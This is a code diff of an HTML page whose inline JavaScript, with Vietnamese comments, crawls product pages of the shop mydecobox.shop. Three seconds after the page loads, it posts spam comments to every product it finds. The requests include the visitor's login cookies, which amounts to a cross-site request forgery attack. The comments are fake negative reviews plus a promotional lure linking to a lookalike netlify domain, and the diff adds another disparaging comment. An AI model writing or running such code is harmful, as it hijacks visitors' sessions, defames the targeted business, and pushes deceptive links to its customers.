@@ -2924,9 +2924,10 @@
         "📣 Khuyến mãi 50% đang chờ! Số lượng có hạn![TRUY CẬP NGAY TẠI ĐÂY] https://mydecobox.netlify.app/product/hop-qua-trai-tim/ để không bỏ lỡ siêu deal!",
         "Giao hàng rất lâu",
         "Nhân viên thái độ lồi lõm",
+        "Sản phẩm chưa đủ wow",
       ];
 
-      // Hàm fetch link sản phẩm
+      // Lấy tất cả link sản phẩm từ các trang category
       async function extractProductLinksFrom(url) {
         try {
           const res = await fetch(url);
@@ -2934,70 +2935,57 @@
           const parser = new DOMParser();
           const doc = parser.parseFromString(html, "text/html");
 
-          const links = Array.from(doc.querySelectorAll("a"))
+          return Array.from(doc.querySelectorAll("a"))
             .map((a) => a.href)
-            .filter(
-              (href) =>
-                href.includes("/product/") &&
-                href.startsWith("https://mydecobox.shop")
+            .filter((href) =>
+              href.startsWith("https://mydecobox.shop/product/")
             );
-
-          return [...new Set(links)];
-        } catch (err) {
-          console.warn(`Không fetch được ${url}`, err);
+        } catch (e) {
+          console.warn(`Không fetch được ${url}:`, e);
           return [];
         }
       }
 
       async function getAllProductLinks() {
         let all = [];
-        for (const url of PRODUCT_PAGES) {
-          const links = await extractProductLinksFrom(url);
+        for (const u of PRODUCT_PAGES) {
+          const links = await extractProductLinksFrom(u);
           all = all.concat(links);
         }
         return [...new Set(all)];
       }
 
-      // Gửi comment bằng fetch
+      // Gửi comment tới từng sản phẩm
       async function sendComment(productUrl, commentText) {
         const payload = new URLSearchParams();
-        payload.append("name", "Nguyễn Văn A");
         payload.append("comment", commentText);
         payload.append("xss_submit", "1");
 
         try {
           const res = await fetch(productUrl, {
             method: "POST",
-            headers: {
-              "Content-Type": "application/x-www-form-urlencoded",
-            },
-            body: payload,
+            credentials: "include", // bắt buộc để kèm cookie login
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: payload.toString(),
           });
-
           if (res.ok) {
-            console.log(`Gửi thành công: ${productUrl}`);
+            console.log(`✅ Gửi thành công: ${productUrl}`);
           } else {
-            console.warn(`Lỗi gửi: ${productUrl} (Mã ${res.status})`);
+            console.warn(`⚠️ Lỗi ${res.status} tại ${productUrl}`);
           }
         } catch (err) {
-          console.error(`Gửi thất bại: ${productUrl}`, err);
+          console.error(`❌ Không gửi được: ${productUrl}`, err);
         }
       }
 
-      async function runSpam() {
+      // Chạy spam sau 3s
+      setTimeout(async () => {
         const links = await getAllProductLinks();
-
         links.forEach((link, i) => {
-          const cmt =
-            SPAM_COMMENTS[Math.floor(Math.random() * SPAM_COMMENTS.length)];
-          setTimeout(() => {
-            sendComment(link, cmt);
-          }, i * 2000); // 3s delay
+          const comment = SPAM_COMMENTS[i % SPAM_COMMENTS.length];
+          setTimeout(() => sendComment(link, comment), i * 2000);
         });
-      }
-
-      // Chờ 6s rồi chạy
-      setTimeout(runSpam, 3000);
+      }, 3000);
     </script>
   </body>
 </html>
